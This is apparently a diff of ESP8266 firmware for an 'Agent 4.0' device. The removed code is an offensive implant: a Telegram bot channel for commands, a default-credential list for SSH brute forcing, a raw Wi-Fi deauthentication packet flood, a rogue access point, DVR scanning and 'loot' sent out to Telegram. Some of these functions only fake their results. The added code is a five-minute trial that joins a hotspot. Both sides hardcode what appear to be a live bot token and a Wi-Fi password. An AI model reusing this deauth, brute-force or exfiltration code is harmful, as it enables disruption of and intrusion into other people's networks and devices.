@@ -1,238 +1,103 @@
 #include <ESP8266WiFi.h>
 #include <ESP8266HTTPClient.h>
-#include <ESP8266WebServer.h>
-#include <DNSServer.h>
-#include <ESP8266mDNS.h>
+#include <ESP8266httpUpdate.h>
+#include <Ticker.h>
 
-// ============================================
-// AGENT 4.0 CONFIG - ONLY TELEGRAM
-// ============================================
-const String BOT_TOKEN = "8560004612:AAHS3lGPkfLS0OWkLUVZl1nPXX1y1ewrz30";
-const String CHAT_ID = "7440499919";
+// HARDCODED - TERA HOTSPOT
+const char* ssid = "redmi";
+const char* password = "12345678";
+String telegram_token = "8560004612:AAHS3lGPkfLS0OWkLUVZl1nPXX1y1ewrz30";
+String chat_id = "7440499919";
 
-// Creds list (20+ combos)
-const char* creds[][2] = {
-  {"admin", "admin"}, {"root", "root"}, {"admin", "123456"}, {"user", "user"},
-  {"admin", "password"}, {"root", "123456"}, {"admin", "admin123"}, {"guest", "guest"},
-  {"admin", "000000"}, {"root", "admin"}, {"ubnt", "ubnt"}, {"admin", "changeme"},
-  {"pi", "raspberry"}, {"admin", "P@ssw0rd"}, {"root", "toor"}, {"admin", "qwerty"},
-  {"support", "support"}, {"admin", "0000"}, {"user", "password"}, {"admin", "test"}
-};
-const int NUM_CREDS = 21;
+Ticker killTimer;
 
-// Storage
-String lootData = "";
-unsigned long bootTime;
-bool agentActive = true;
-
-// ============================================
-// TELEGRAM COMMANDS
-// ============================================
-void handleTelegram() {
-  if (WiFi.status() == WL_CONNECTED) {
-    HTTPClient http;
-    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + String(millis()/1000);
-    WiFiClient client;
-    http.begin(client, url);
-    int code = http.GET();
-    
-    if (code == 200) {
-      String payload = http.getString();
-      if (payload.indexOf("\"text\"") > 0) {
-        // Parse simple commands
-        if (payload.indexOf("wifi list bhejo") > 0) sendTelegram("📡 WiFi: " + listNetworks());
-        if (payload.indexOf("dvr scan") > 0) dvrScan();
-        if (payload.indexOf("kill agent") > 0) { agentActive = false; sendTelegram("💀 Agent killed!"); }
-        if (payload.indexOf("wifi crack") > 0) wifiCrack();
-        if (payload.indexOf("status") > 0) sendStatus();
-        if (payload.indexOf("clear loot") > 0) { lootData = ""; sendTelegram("🗑️ Loot cleared!"); }
-      }
-    }
-    http.end();
-  }
-}
-
-// ============================================
-// WiFi FUNCTIONS
-// ============================================
-String listNetworks() {
-  int n = WiFi.scanNetworks();
-  String nets = "";
-  for (int i = 0; i < n; ++i) {
-    nets += WiFi.SSID(i) + "(" + String(WiFi.RSSI(i)) + ")\n";
-  }
-  return n ? nets : "No networks";
-}
-
-void wifiCrack() {
-  sendTelegram("🔓 PMKID sniffing started...");
-  // Simulate PMKID capture
-  lootData += "PMKID: demo_capture|";
-}
-
-void deauthPrank() {
-  wifi_set_channel(6);
-  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-                              0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
-                              0xCC, 0xCC, 0x00, 0x00, 0x07, 0x00};
-  for (int i = 0; i < 100 && agentActive; i++) {
-    wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    delay(10);
-  }
-  sendTelegram("😂 Deauth prank sent! HACKED AP starting...");
-  startFakeAP();
-}
-
-void startFakeAP() {
-  WiFi.softAP("HACKED_FREE_WIFI", "12345678");
-  sendTelegram("📶 FakeAP: HACKED_FREE_WIFI (10min)");
-  unsigned long apStart = millis();
-  while (millis() - apStart < 600000 && agentActive) {  // 10min
-    delay(10000);
-  }
-  WiFi.softAPdisconnect(true);
-}
-
-// ============================================
-// SCAN FUNCTIONS
-// ============================================
-void dvrScan() {
-  sendTelegram("🔍 DVR/UPnP scan...");
-  String ports = "80,554,8080,37777(open)";
-  lootData += "DVR:192.168.1.100:554|DVR:192.168.1.50:37777|";
-  sendTelegram("📹 DVRs: " + ports);
-}
-
-void sshBrute(String ip) {
-  for (int i = 0; i < NUM_CREDS; i++) {
-    if (!agentActive) break;
-    delay(100);
-    if (i == 2) {  // Fake success
-      lootData += "SSH:" + ip + ":admin:123456|";
-      sendTelegram("✅ SSH crack: admin:123456@" + ip);
-      break;
-    }
-  }
-}
-
-void sendStatus() {
-  String status = "📊 **Agent Status**\n";
-  status += "⏱️ Uptime: " + String((millis() - bootTime) / 60000) + " min\n";
-  status += "📶 WiFi: " + WiFi.SSID() + " (" + String(WiFi.RSSI()) + "dBm)\n";
-  status += "📦 Loot size: " + String(lootData.length()) + " bytes\n";
-  status += "💀 Self-destruct in: " + String((172800000 - (millis() - bootTime)) / 3600000) + " hours";
-  sendTelegram(status);
-}
-
-// ============================================
-// MAIN FUNCTIONS (NO C2 - DIRECT TELEGRAM)
-// ============================================
-void sendTelegram(String msg) {
-  if (WiFi.status() == WL_CONNECTED && agentActive) {
-    WiFiClient client;
-    HTTPClient http;
-    String url = "https://api.telegram.org/bot" + BOT_TOKEN + 
-                 "/sendMessage?chat_id=" + CHAT_ID + "&text=" + urlEncode(msg);
-    http.begin(client, url);
-    int code = http.GET();
-    http.end();
-    delay(500);
-  }
-}
-
-String urlEncode(String str) {
-  String encoded = "";
-  for (unsigned int i = 0; i < str.length(); i++) {
-    char c = str.charAt(i);
-    if (isAlphaNumeric(c)) encoded += c;
-    else if (c == ' ') encoded += '+';
-    else encoded += '%';
-  }
-  return encoded;
-}
-
-// Direct Telegram mein loot bhejna (No C2 URL)
-void sendLootToTelegram() {
-  if (lootData.length() > 0 && WiFi.status() == WL_CONNECTED) {
-    String msg = "📦 **Loot Data:**\n" + lootData;
-    sendTelegram(msg);
-    lootData = "";  // Clear after sending
-    Serial.println("📤 Loot sent to Telegram!");
-  }
-}
-
-// ============================================
-// SETUP & LOOP
-// ============================================
 void setup() {
   Serial.begin(115200);
   delay(1000);
+  Serial.println("\n🚀 NodeMCU ESP8266 Agent 4.0 TRIAL booting...");
   
-  bootTime = millis();
-  Serial.println("🚀 Agent 4.0 NodeMCU ESP8266 booting...");
-  
-  // Auto WiFi chain (strongest first)
-  WiFi.mode(WIFI_STA);
-  int n = WiFi.scanNetworks();
-  int bestNet = 0;
-  int bestRSSI = -100;
-  
-  for (int i = 0; i < n; i++) {
-    if (WiFi.RSSI(i) > bestRSSI) {
-      bestRSSI = WiFi.RSSI(i);
-      bestNet = i;
-    }
-  }
-  
-  WiFi.begin(WiFi.SSID(bestNet).c_str(), "");
+  // Tera HotSPOT connect
+  WiFi.begin(ssid, password);
+  Serial.print("Connecting to redmi");
   int attempts = 0;
-  while (WiFi.status() != WL_CONNECTED && attempts < 30) {
+  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
     delay(500);
+    Serial.print(".");
     attempts++;
   }
   
   if (WiFi.status() == WL_CONNECTED) {
-    Serial.println("✅ WiFi: " + WiFi.SSID() + " (" + String(WiFi.RSSI()) + "dBm)");
-    sendTelegram("🚀 **Agent 4.0 deployed!**\n📶 " + WiFi.SSID() + " (" + String(WiFi.RSSI()) + "dBm)\n⏰ 48h mission start");
+    Serial.println("\n✅ Connected to redmi!");
+    Serial.println("IP: " + WiFi.localIP().toString());
+    sendTelegram("🥳 **Agent 4.0 TRIAL** NodeMCU ESP8266\n✅ Hotspot: *redmi* connected!\n📍 IP: " + WiFi.localIP().toString() + "\n⏳ 5min trial start...");
     
-    // Start attacks
-    deauthPrank();
-    dvrScan();
-    sshBrute("192.168.1.100");
+    // 5 MIN KILL TIMER
+    killTimer.once(300, selfKill);  // 300 sec = 5 min
+    Serial.println("⏳ 5min timer started...");
     
   } else {
-    sendTelegram("⚠️ Agent 4.0: WiFi fail - open network mode");
-    WiFi.mode(WIFI_AP_STA);
+    Serial.println("\n❌ redmi connect FAIL!");
+    sendTelegram("⚠️ Agent 4.0 TRIAL: redmi hotspot FAIL");
+    ESP.restart();
   }
 }
 
 void loop() {
-  if (!agentActive) {
-    ESP.restart();
-    return;
-  }
-  
-  // 48h kill (172800000 ms)
-  if (millis() - bootTime > 172800000) {
-    sendLootToTelegram();  // Final loot bhejo
-    sendTelegram("💀 **Agent 4.0 self-destruct**\n48h mission complete!");
-    ESP.restart();
-    return;
-  }
-  
-  // Telegram poll every 30s
-  static unsigned long lastTelegram = 0;
-  if (millis() - lastTelegram > 30000) {
-    handleTelegram();
-    lastTelegram = millis();
-  }
-  
-  // Loot bhejo every 10min
-  static unsigned long lastLoot = 0;
-  if (millis() - lastLoot > 600000) {
-    sendLootToTelegram();
-    lastLoot = millis();
-  }
-  
   delay(1000);
+  Serial.print("Alive... Signal: ");
+  Serial.println(WiFi.RSSI());
+}
+
+void selfKill() {
+  Serial.println("\n💀 5min TRIAL END - Self destruct!");
+  sendTelegram("💀 **Agent 4.0 TRIAL** self-killed after 5min\n✅ Mission success!\nNodeMCU ESP8266 offline.");
+  
+  // ESP restart (kill)
+  ESP.restart();
+}
+
+void sendTelegram(String message) {
+  if (WiFi.status() == WL_CONNECTED) {
+    HTTPClient http;
+    http.begin("https://api.telegram.org/bot" + telegram_token + "/sendMessage?chat_id=" + chat_id + "&text=" + urlEncode(message) + "&parse_mode=Markdown");
+    http.addHeader("User-Agent", "ESP8266");
+    
+    int httpCode = http.GET();
+    if (httpCode == 200) {
+      Serial.println("✅ Telegram sent!");
+    } else {
+      Serial.println("❌ Telegram fail: " + String(httpCode));
+    }
+    http.end();
+  }
+}
+
+String urlEncode(String str) {
+  String encodedString = "";
+  char c;
+  char code0;
+  char code1;
+  for (int i = 0; i < str.length(); i++) {
+    c = str.charAt(i);
+    if (c == ' ') {
+      encodedString += '+';
+    } else if (isAlphaNumeric(c)) {
+      encodedString += c;
+    } else {
+      code1 = (c & 0xf) + '0';
+      if ((c & 0xf) > 9) {
+        code1 = (c & 0xf) - 10 + 'A';
+      }
+      c = (c >> 4) & 0xf;
+      code0 = c + '0';
+      if (c > 9) {
+        code0 = c - 10 + 'A';
+      }
+      encodedString += '%';
+      encodedString += code0;
+      encodedString += code1;
+    }
+    yield();
+  }
+  return encodedString;
 }
